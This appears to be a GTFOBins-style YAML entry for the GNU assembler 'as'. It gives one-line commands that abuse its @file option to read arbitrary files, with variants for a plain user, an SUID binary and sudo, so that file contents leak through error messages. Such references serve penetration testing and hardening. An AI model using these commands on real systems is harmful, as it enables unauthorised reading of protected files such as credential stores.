---
description: The file content is treated as command line options and disclosed throught error messages, so this is not suitable to read arbitrary binary data.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        as @$LFILE
  suid:
    - code: |
        LFILE=file_to_read
        ./as @$LFILE
  sudo:
    - code: |
        LFILE=file_to_read
        sudo as @$LFILE
---
